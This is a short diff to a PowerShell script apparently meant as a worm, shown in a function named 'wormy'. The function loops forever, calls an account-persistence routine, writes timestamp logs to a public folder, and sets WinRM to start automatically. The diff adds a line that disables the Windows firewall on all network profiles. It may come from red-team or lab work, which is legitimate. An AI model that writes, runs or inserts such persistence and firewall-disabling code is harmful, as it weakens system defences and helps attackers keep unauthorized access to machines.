@@ -61,6 +61,7 @@ function wormy{
     
     while(1 -eq 1){
     accountPersist
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
     Write-Output 'slither'
     Set-Service -Name WinRM -StartupType Automatic
